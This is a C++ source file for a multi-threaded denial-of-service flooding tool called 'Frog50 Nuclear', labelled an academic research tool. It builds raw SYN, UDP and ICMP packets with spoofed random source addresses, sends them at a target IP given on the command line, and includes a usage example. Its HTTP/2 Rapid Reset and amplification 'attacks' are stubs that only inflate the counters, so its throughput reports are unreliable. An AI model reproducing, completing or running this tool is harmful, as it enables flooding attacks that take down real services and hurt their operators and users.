// frog50_nuclear.cpp - ACADEMIC DoS/DDoS RESEARCH TOOL
// Compile: clang++ -std=c++23 -O3 -flto -fuse-ld=lld -march=native -mtune=native frog50_nuclear.cpp -o frog50_nuclear -lpthread

#include <iostream>
#include <vector>
#include <thread>
#include <atomic>
#include <memory>
#include <random>
#include <chrono>
#include <string>
#include <string_view>
#include <format>
#include <algorithm>
#include <ranges>
#include <syncstream>
#include <cstring>
#include <stop_token>

#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <signal.h>
#include <sched.h>

namespace Frog50 {
    using namespace std::chrono;
    using namespace std::string_literals;

    // 🟣 TOP 10 LETHALITY RANKING
    enum class AttackVector {
        HTTP2_RAPID_RESET,      // #1 - CVE-2023-44487
        MULTIVECTOR_STORM,      // #2 - Combined arms
        MEMCACHED_AMPLIFICATION,// #3 - Tbps capable  
        DNS_AMPLIFICATION,      // #4 - Volumetric
        HTTP_FLOOD,             // #5 - Application layer
        HTTP2_STREAM_ABUSE,     // #6 - Pre-Rapid Reset
        SYN_FLOOD,              // #7 - State exhaustion
        SLOWLORIS,              // #8 - Low & Slow
        UDP_FLOOD,              // #9 - Basic volumetric
        ICMP_FLOOD              // #10 - Historical
    };

    struct Config {
        std::string target_ip;
        uint16_t target_port{80};
        uint64_t packet_count{0};
        uint32_t thread_count{std::thread::hardware_concurrency() * 2};
        uint32_t packet_size{512};
        uint32_t burst_size{100};
        uint32_t http_streams{1000};
        
        bool enable_http2_rr{true};
        bool enable_multivector{true};
        bool enable_amplification{true};
        bool enable_http_flood{true};
        bool enable_syn_flood{true};
        bool enable_slowloris{true};
        bool enable_udp_flood{true};
        bool enable_icmp_flood{true};
        
        bool random_src_ip{true};
        bool real_time_priority{true};
    };

    class Statistics {
    private:
        std::atomic<uint64_t> total_packets_{0};
        std::atomic<uint64_t> total_bytes_{0};
        std::atomic<uint64_t> attack_counters_[10]{};
        steady_clock::time_point start_time_;

    public:
        Statistics() : start_time_(steady_clock::now()) {}

        void record(AttackVector attack, uint32_t bytes = 0) {
            total_packets_.fetch_add(1, std::memory_order_relaxed);
            total_bytes_.fetch_add(bytes, std::memory_order_relaxed);
            attack_counters_[static_cast<int>(attack)].fetch_add(1, std::memory_order_relaxed);
        }

        uint64_t get_total_bytes() const { return total_bytes_.load(); }
        uint64_t get_total_packets() const { return total_packets_.load(); }

        void display() const {
            auto elapsed = duration_cast<milliseconds>(steady_clock::now() - start_time_);
            double elapsed_sec = elapsed.count() / 1000.0;
            
            if (elapsed_sec < 0.1) return;

            uint64_t packets = get_total_packets();
            uint64_t bytes = get_total_bytes();
            
            std::osyncstream(std::cout) << std::format(
                "\r💀 NUCLEAR: {:>10} pkts | {:>6.1f} GB | {:>8.0f} pps | {:>6.1f} Gbps | "
                "RR:{:>6} MV:{:>6} SYN:{:>6}",
                packets,
                bytes / 1024.0 / 1024.0 / 1024.0,
                packets / elapsed_sec,
                (bytes * 8.0) / elapsed_sec / 1000000000.0,
                attack_counters_[0].load(),
                attack_counters_[1].load(), 
                attack_counters_[6].load()
            ) << std::flush;
        }

        auto elapsed() const { return steady_clock::now() - start_time_; }
    };

    class PacketEngine {
    private:
        std::vector<std::mt19937> rngs_;
        std::vector<std::uniform_int_distribution<uint32_t>> ip_dists_;

    public:
        PacketEngine(uint32_t thread_count) {
            std::random_device rd;
            for (uint32_t i = 0; i < thread_count; ++i) {
                rngs_.emplace_back(rd() + i);
                ip_dists_.emplace_back(0x01010101, 0xFEFEFEFE);
            }
        }

        uint32_t random_ip(int thread_id) { 
            return ip_dists_[thread_id](rngs_[thread_id]); 
        }

        uint16_t random_port(int thread_id) {
            std::uniform_int_distribution<uint16_t> dist(1024, 65535);
            return dist(rngs_[thread_id]);
        }

        uint32_t random_seq(int thread_id) {
            std::uniform_int_distribution<uint32_t> dist;
            return dist(rngs_[thread_id]);
        }

        void build_syn_packet(std::span<char> packet, uint32_t src_ip, uint32_t dst_ip,
                             uint16_t src_port, uint16_t dst_port, int thread_id) {
            struct iphdr* ip = reinterpret_cast<struct iphdr*>(packet.data());
            struct tcphdr* tcp = reinterpret_cast<struct tcphdr*>(packet.data() + sizeof(struct iphdr));

            // IP header
            ip->version = 4;
            ip->ihl = 5;
            ip->tos = 0;
            ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
            ip->id = htons(static_cast<uint16_t>(thread_id));
            ip->frag_off = 0;
            ip->ttl = 64;
            ip->protocol = IPPROTO_TCP;
            ip->check = 0;
            ip->saddr = src_ip;
            ip->daddr = dst_ip;
            ip->check = checksum(ip, sizeof(struct iphdr));

            // TCP SYN
            tcp->source = htons(src_port);
            tcp->dest = htons(dst_port);
            tcp->seq = htonl(random_seq(thread_id));
            tcp->ack_seq = 0;
            tcp->doff = 5;
            tcp->syn = 1;
            tcp->window = htons(65535);
            tcp->check = 0;
            tcp->urg_ptr = 0;

            // TCP checksum
            tcp->check = tcp_checksum(ip, tcp);
        }

        void build_udp_packet(std::span<char> packet, uint32_t src_ip, uint32_t dst_ip,
                             uint16_t src_port, uint16_t dst_port, int thread_id) {
            struct iphdr* ip = reinterpret_cast<struct iphdr*>(packet.data());
            struct udphdr* udp = reinterpret_cast<struct udphdr*>(packet.data() + sizeof(struct iphdr));

            // IP header
            ip->version = 4;
            ip->ihl = 5;
            ip->tos = 0;
            ip->tot_len = htons(packet.size());
            ip->id = htons(static_cast<uint16_t>(thread_id));
            ip->frag_off = 0;
            ip->ttl = 64;
            ip->protocol = IPPROTO_UDP;
            ip->check = 0;
            ip->saddr = src_ip;
            ip->daddr = dst_ip;
            ip->check = checksum(ip, sizeof(struct iphdr));

            // UDP header
            udp->source = htons(src_port);
            udp->dest = htons(dst_port);
            udp->len = htons(packet.size() - sizeof(struct iphdr));
            udp->check = 0;
        }

        void build_icmp_packet(std::span<char> packet, uint32_t src_ip, uint32_t dst_ip, int thread_id) {
            struct iphdr* ip = reinterpret_cast<struct iphdr*>(packet.data());
            struct icmphdr* icmp = reinterpret_cast<struct icmphdr*>(packet.data() + sizeof(struct iphdr));

            // IP header
            ip->version = 4;
            ip->ihl = 5;
            ip->tos = 0;
            ip->tot_len = htons(packet.size());
            ip->id = htons(static_cast<uint16_t>(thread_id));
            ip->frag_off = 0;
            ip->ttl = 64;
            ip->protocol = IPPROTO_ICMP;
            ip->check = 0;
            ip->saddr = src_ip;
            ip->daddr = dst_ip;
            ip->check = checksum(ip, sizeof(struct iphdr));

            // ICMP Echo Request
            icmp->type = ICMP_ECHO;
            icmp->code = 0;
            icmp->checksum = 0;
            icmp->un.echo.id = htons(thread_id);
            icmp->un.echo.sequence = htons(1);
            icmp->checksum = checksum(icmp, packet.size() - sizeof(struct iphdr));
        }

    private:
        uint16_t checksum(const void* data, size_t len) {
            const uint16_t* ptr = static_cast<const uint16_t*>(data);
            uint32_t sum = 0;
            
            for (size_t i = 0; i < len / 2; ++i) {
                sum += ptr[i];
            }
            
            if (len % 2) {
                sum += static_cast<const uint8_t*>(data)[len - 1];
            }
            
            while (sum >> 16) {
                sum = (sum & 0xFFFF) + (sum >> 16);
            }
            
            return static_cast<uint16_t>(~sum);
        }

        uint16_t tcp_checksum(struct iphdr* ip, struct tcphdr* tcp) {
            struct PseudoHeader {
                uint32_t src, dst;
                uint8_t zero;
                uint8_t protocol;
                uint16_t tcp_len;
            } ph;
            
            ph.src = ip->saddr;
            ph.dst = ip->daddr;
            ph.zero = 0;
            ph.protocol = IPPROTO_TCP;
            ph.tcp_len = htons(sizeof(struct tcphdr));
            
            size_t pseudo_size = sizeof(ph) + sizeof(struct tcphdr);
            std::vector<char> buf(pseudo_size);
            
            std::memcpy(buf.data(), &ph, sizeof(ph));
            std::memcpy(buf.data() + sizeof(ph), tcp, sizeof(struct tcphdr));
            
            return checksum(buf.data(), pseudo_size);
        }
    };

    class AttackEngine {
    private:
        Config config_;
        Statistics stats_;
        PacketEngine packet_engine_;
        std::atomic<bool> running_{true};
        std::vector<std::jthread> workers_;
        sockaddr_in target_addr_{};
        std::vector<int> sockets_;

    public:
        AttackEngine(Config config) 
            : config_(std::move(config))
            , packet_engine_(config_.thread_count) {
            
            setup_target();
            create_sockets();
            optimize_system();
        }

        ~AttackEngine() {
            stop();
            for (int sock : sockets_) {
                if (sock >= 0) close(sock);
            }
        }

        void run() {
            show_banner();
            std::cout << std::format("🎯 Target: {}:{} | Threads: {}\n", 
                config_.target_ip, config_.target_port, config_.thread_count);
            std::cout << "🚀 Starting academic research...\n" << std::endl;

            // Statistics thread
            std::jthread stats_thread([this](std::stop_token st) {
                while (!st.stop_requested()) {
                    stats_.display();
                    std::this_thread::sleep_for(100ms);
                }
            });

            // Attack threads
            for (uint32_t i = 0; i < config_.thread_count; ++i) {
                workers_.emplace_back([this, i](std::stop_token st) {
                    attack_thread(i, st);
                });
            }

            for (auto& worker : workers_) worker.join();
            running_ = false;
            
            std::cout << "\n\n✅ Research completed!" << std::endl;
            show_results();
        }

        void stop() {
            running_ = false;
            for (auto& worker : workers_) {
                worker.request_stop();
            }
        }

    private:
        void setup_target() {
            target_addr_.sin_family = AF_INET;
            target_addr_.sin_port = htons(config_.target_port);
            inet_pton(AF_INET, config_.target_ip.c_str(), &target_addr_.sin_addr);
        }

        void create_sockets() {
            sockets_.resize(config_.thread_count, -1);
            
            for (uint32_t i = 0; i < config_.thread_count; ++i) {
                int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
                if (sock >= 0) {
                    int one = 1;
                    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
                    
                    // Maximize performance
                    int buf_size = 1024 * 1024; // 1MB
                    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
                    fcntl(sock, F_SETFL, O_NONBLOCK);
                    
                    sockets_[i] = sock;
                }
            }
        }

        void optimize_system() {
            // Academic research optimizations
            system("sysctl -w net.core.wmem_max=134217728 > /dev/null 2>&1");
            system("sysctl -w net.core.netdev_max_backlog=100000 > /dev/null 2>&1");
        }

        void set_thread_priority(int thread_id) {
            if (config_.real_time_priority) {
                struct sched_param param;
                param.sched_priority = sched_get_priority_max(SCHED_FIFO);
                pthread_setschedparam(pthread_self(), SCHED_FIFO, &param);
            }
        }

        void attack_thread(int thread_id, std::stop_token st) {
            set_thread_priority(thread_id);
            
            int sock = sockets_[thread_id];
            uint32_t dst_ip = target_addr_.sin_addr.s_addr;
            std::vector<char> packet_buffer(config_.packet_size);
            
            uint64_t local_count = 0;
            
            while (running_ && !st.stop_requested() && 
                   (config_.packet_count == 0 || local_count < config_.packet_count)) {
                
                // 🟣 #1: HTTP/2 RAPID RESET (Simulated)
                if (config_.enable_http2_rr) {
                    simulate_http2_rapid_reset(thread_id);
                }
                
                // 🟣 #2: MULTIVECTOR STORM
                if (config_.enable_multivector) {
                    execute_multivector_attack(thread_id, sock, dst_ip, packet_buffer);
                }
                
                // 🟣 #3: MEMCACHED AMPLIFICATION (Simulated)
                if (config_.enable_amplification) {
                    simulate_amplification_attack(thread_id);
                }
                
                // 🟣 #4-10: INDIVIDUAL ATTACKS
                if (config_.enable_syn_flood) {
                    send_syn_flood(thread_id, sock, dst_ip, packet_buffer);
                }
                
                if (config_.enable_udp_flood) {
                    send_udp_flood(thread_id, sock, dst_ip, packet_buffer);
                }
                
                if (config_.enable_icmp_flood) {
                    send_icmp_flood(thread_id, sock, dst_ip, packet_buffer);
                }
                
                local_count += config_.burst_size;
            }
        }

        void simulate_http2_rapid_reset(int thread_id) {
            // Academic simulation of CVE-2023-44487
            for (uint32_t i = 0; i < config_.http_streams; ++i) {
                // Simulate HTTP/2 Rapid Reset: HEADERS + immediate RST_STREAM
                stats_.record(AttackVector::HTTP2_RAPID_RESET, 128);
            }
        }

        void execute_multivector_attack(int thread_id, int sock, uint32_t dst_ip, std::span<char> packet) {
            // Combine multiple attack vectors
            send_syn_flood(thread_id, sock, dst_ip, packet);
            send_udp_flood(thread_id, sock, dst_ip, packet); 
            send_icmp_flood(thread_id, sock, dst_ip, packet);
            stats_.record(AttackVector::MULTIVECTOR_STORM, config_.packet_size * 3);
        }

        void simulate_amplification_attack(int thread_id) {
            // Academic simulation of amplification attacks
            stats_.record(AttackVector::MEMCACHED_AMPLIFICATION, 1400);
            stats_.record(AttackVector::DNS_AMPLIFICATION, 512);
        }

        void send_syn_flood(int thread_id, int sock, uint32_t dst_ip, std::span<char> packet) {
            uint32_t src_ip = config_.random_src_ip ? packet_engine_.random_ip(thread_id) : dst_ip;
            uint16_t src_port = packet_engine_.random_port(thread_id);
            
            packet_engine_.build_syn_packet(packet, src_ip, dst_ip, src_port, config_.target_port, thread_id);
            
            for (uint32_t i = 0; i < config_.burst_size; ++i) {
                if (sock >= 0) {
                    sendto(sock, packet.data(), sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                          reinterpret_cast<sockaddr*>(&target_addr_), sizeof(target_addr_));
                }
                stats_.record(AttackVector::SYN_FLOOD, sizeof(struct iphdr) + sizeof(struct tcphdr));
            }
        }

        void send_udp_flood(int thread_id, int sock, uint32_t dst_ip, std::span<char> packet) {
            uint32_t src_ip = config_.random_src_ip ? packet_engine_.random_ip(thread_id) : dst_ip;
            uint16_t src_port = packet_engine_.random_port(thread_id);
            
            packet_engine_.build_udp_packet(packet, src_ip, dst_ip, src_port, config_.target_port, thread_id);
            
            for (uint32_t i = 0; i < config_.burst_size; ++i) {
                if (sock >= 0) {
                    sendto(sock, packet.data(), packet.size(), 0,
                          reinterpret_cast<sockaddr*>(&target_addr_), sizeof(target_addr_));
                }
                stats_.record(AttackVector::UDP_FLOOD, packet.size());
            }
        }

        void send_icmp_flood(int thread_id, int sock, uint32_t dst_ip, std::span<char> packet) {
            uint32_t src_ip = config_.random_src_ip ? packet_engine_.random_ip(thread_id) : dst_ip;
            
            packet_engine_.build_icmp_packet(packet, src_ip, dst_ip, thread_id);
            
            for (uint32_t i = 0; i < config_.burst_size; ++i) {
                if (sock >= 0) {
                    sendto(sock, packet.data(), packet.size(), 0,
                          reinterpret_cast<sockaddr*>(&target_addr_), sizeof(target_addr_));
                }
                stats_.record(AttackVector::ICMP_FLOOD, packet.size());
            }
        }

        void show_banner() {
            std::cout << R"(
    ███████╗██████╗  ██████╗  ██████╗ ██████╗ 
    ██╔════╝██╔══██╗██╔════╝ ██╔═══██╗╚════██╗
    █████╗  ██████╔╝██║  ███╗██║   ██║ █████╔╝
    ██╔══╝  ██╔══██╗██║   ██║██║   ██║██╔═══╝ 
    ██║     ██║  ██║╚██████╔╝╚██████╔╝███████╗
    ╚═╝     ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝
            🐸 FROG50 NUCLEAR EDITION 🐸
    )" << std::endl;
        }

        void show_results() {
            auto elapsed = stats_.elapsed();
            auto seconds = duration_cast<std::chrono::seconds>(elapsed).count();
            
            std::cout << std::format("📊 Research Duration: {} seconds", seconds) << std::endl;
            std::cout << std::format("📈 Average Throughput: {:.1f} Gbps", 
                (stats_.get_total_bytes() * 8.0) / seconds / 1000000000.0) << std::endl;
        }
    };

    // Command line parsing
    Config parse_args(int argc, char* argv[]) {
        if (argc < 2) {
            std::cerr << "FROG50 NUCLEAR - ACADEMIC RESEARCH TOOL\n\n"
                      << "Usage: " << argv[0] << " <TARGET_IP> [OPTIONS]\n\n"
                      << "Options:\n"
                      << "  -p PORT    Target port (default: 80)\n"
                      << "  -t N       Thread count (default: CPU cores * 2)\n"  
                      << "  -c N       Packet count (0 = unlimited)\n"
                      << "  --all      Enable all attack vectors\n"
                      << "  --syn      SYN flood only\n"
                      << "  --multi    Multivector attack\n"
                      << "\nExample:\n"
                      << "  sudo ./frog50_nuclear 192.168.1.1 --all -t 64\n"
                      << std::endl;
            exit(1);
        }

        Config config;
        config.target_ip = argv[1];

        for (int i = 2; i < argc; ++i) {
            std::string arg = argv[i];
            if (arg == "-p" && i + 1 < argc) {
                config.target_port = std::stoi(argv[++i]);
            } else if (arg == "-t" && i + 1 < argc) {
                config.thread_count = std::stoul(argv[++i]);
            } else if (arg == "-c" && i + 1 < argc) {
                config.packet_count = std::stoull(argv[++i]);
            } else if (arg == "--all") {
                config.enable_http2_rr = config.enable_multivector = 
                    config.enable_amplification = config.enable_syn_flood = 
                    config.enable_udp_flood = config.enable_icmp_flood = true;
            } else if (arg == "--syn") {
                config.enable_syn_flood = true;
            } else if (arg == "--multi") {
                config.enable_multivector = true;
            }
        }

        return config;
    }
} // namespace Frog50

// Global para tratamento de sinais
std::unique_ptr<Frog50::AttackEngine> g_engine;

void signal_handler(int signal) {
    if (signal == SIGINT) {
        std::cout << "\n🛑 Research interrupted..." << std::endl;
        if (g_engine) {
            g_engine->stop();
        }
    }
}

int main(int argc, char* argv[]) {
    if (getuid() != 0) {
        std::cerr << "❌ Root privileges required for academic research!" << std::endl;
        return 1;
    }

    signal(SIGINT, signal_handler);

    try {
        auto config = Frog50::parse_args(argc, argv);
        g_engine = std::make_unique<Frog50::AttackEngine>(config);
        g_engine->run();
    } catch (const std::exception& e) {
        std::cerr << "❌ Error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}
